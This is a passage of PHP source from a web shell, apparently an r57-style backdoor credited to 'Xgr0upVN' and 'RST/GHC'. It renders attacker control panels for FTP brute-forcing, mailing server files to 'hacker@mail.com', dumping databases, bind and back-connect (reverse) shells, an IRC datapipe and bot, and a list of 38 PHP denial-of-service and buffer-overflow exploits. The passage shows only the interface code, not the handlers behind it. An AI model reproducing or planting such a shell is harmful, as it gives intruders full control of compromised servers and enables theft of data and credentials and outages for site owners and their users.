echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text94']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').in('hidden','dir',0,$dir));
echo sr(25,"",in('radio','brute_method',0,'passwd',1)."<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href='".$_SERVER['PHP_SELF']."?users'>".$lang[$language.'_text95']."</a> )</font>");
echo sr(25,"",in('checkbox','reverse id=reverse',0,'1',1).$lang[$language.'_text101']);
echo sr(25,"",in('radio','brute_method',0,'dic',0).$lang[$language.'_text129']);
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',0,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("root"))));
echo sr(25,"<b>".$lang[$language.'_text129'].$arrow."</b>",in('text','dictionary',0,(!empty($_POST['dictionary'])?($_POST['dictionary']):($dir.'passw.dic'))));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt1']));
echo $te."</td>".$fe."</tr></div></table>";
}
if(@function_exists("mail")){
echo $table_up1.div_title($lang[$language.'_text102'],'id19').$table_up2.div('id19').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from sniper_sa shell"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."</td>".$fe."</tr></div></table>";
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '<select name=db>';
if($mysql_on) $select .= '<option>MySQL</option>';
if($mssql_on) $select .= '<option>MSSQL</option>';
if($pg_on)    $select .= '<option>PostgreSQL</option>';
if($ora_on)   $select .= '<option>Oracle</option>';
$select .= '</select>';
echo $table_up1.div_title($lang[$language.'_text82'],'id20').$table_up2.div('id20').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text40']."</div></b></font>";
echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";
echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center id='n'><textarea cols=55 rows=1 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></div></table>";
}
if(!$safe_mode&&$unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',15,'9999'));
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'SnIpEr'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'80'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'80'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',15,'6667'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe."</tr></div></table>";
}

if($unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text214'].$arrow."</b>",in('text','ircadmin',15,'ircadmin'));
echo sr(40,"<b>".$lang[$language.'_text215'].$arrow."</b>",in('text','ircserver',15,'ircserver'));
echo sr(40,"<b>".$lang[$language.'_text216'].$arrow."</b>",in('text','ircchanal',15,'ircchanl'));
echo sr(40,"<b>".$lang[$language.'_text217'].$arrow."</b>",in('text','ircname',15,'ircname'));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ips',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','ports',15,'80'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));

echo $te."</td>".$fe."</tr></div></table>";
}
echo $table_up1.div_title($lang[$language.'_text130'],'id1010').$table_up2.div('id1010').$ts."<tr><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text131']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos1').in('submit','submit',0,'Recursive memory exhaustion').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos2').in('submit','submit',0,'Memory_limit [pack()]').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos3').in('submit','submit',0,'BoF [unserialize()]').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos4').in('submit','submit',0,'BoF ZendEngine').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos5').in('submit','submit',0,'SQlite [dl()] vuln').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos6').in('submit','submit',0,'PCRE [preg_match()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos7').in('submit','submit',0,'Mem_limit [str_repeat()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos8').in('submit','submit',0,'Apache process killer').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos9').in('submit','submit',0,'Overload [tempnam()](PHP<5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos10').in('submit','submit',0,'BoF [wordwrap()](PHP<5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos11').in('submit','submit',0,'BoF [array_fill()](PHP<5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos12').in('submit','submit',0,'BoF [substr_compare()](PHP<5.1.2)').$fe);
echo $te."</td><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text131']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos13').in('submit','submit',0,'Arr. Cr. 64b[unserialize()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos14').in('submit','submit',0,'BoF [str_ireplace()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos15').in('submit','submit',0,'BoF [htmlentities()](PHP<5.1.6,4.4.4)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos16').in('submit','submit',0,'BoF [zip_entry_read()](PHP<4.4.5)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos17').in('submit','submit',0,'BoF [sqlite_udf_decode_binary()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos18').in('submit','submit',0,'BoF [msg_receive()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos19').in('submit','submit',0,'BoF [php_stream_filter_create()](PHP5<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos20').in('submit','submit',0,'BoF [unserialize()](PHP<4.4.4)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos21').in('submit','submit',0,'BoF [gdImageCreateTrueColor()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos22').in('submit','submit',0,'BoF [gdImageCopyResized()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos23').in('submit','submit',0,'DoS [iconv_substr()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos24').in('submit','submit',0,'DoS [setlocale()](PHP<5.2.x)').$fe);
echo $te."</td><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text131']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos25').in('submit','submit',0,'DoS [glob()] 1 (PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos26').in('submit','submit',0,'DoS [glob()] 2 (PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos27').in('submit','submit',0,'DoS [fnmatch()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos28').in('submit','submit',0,'BoF [imagepsloadfont()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos29').in('submit','submit',0,'BoF mSQL [msql_connect](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos30').in('submit','submit',0,'BoF [chunk_split()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos31').in('submit','submit',0,'BoF [php_win32sti.dl](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos32').in('submit','submit',0,'BoF [php_iisfunc.dll](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos33').in('submit','submit',0,'BoF [ntuser_getuserlist()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos34').in('submit','submit',0,'DoS [com_print_typeinfo()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos35').in('submit','submit',0,'BoF [iconv()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos36').in('submit','submit',0,'BoF [iconv_m_d_headers()](PHP<5.2.x)').$fe);
echo $te."</td><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text131']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos37').in('submit','submit',0,'BoF [iconv_mime_decode()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos38').in('submit','submit',0,'BoF [iconv_strlen()](PHP<5.2.x)').$fe);
/*echo sr(10,"",$fs.in('hidden','cmd',0,'dos').in('submit','submit',0,'BoF [()](PHP<5.2.x)').$fe);*/
echo $te."</td></tr></div></table>";
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ Xgr0upVN - shell by RST/GHC | <a href=http://Xgr0upVN.Vn>http://Xgr0upVN.Vn</a> | <a href=http://hcegroup.net>H@ck+Cr@ck=Enj0y!</a> | Design by: AluCaR | version ".$version." ]---o</b></font></div></td></tr></table>";
?>
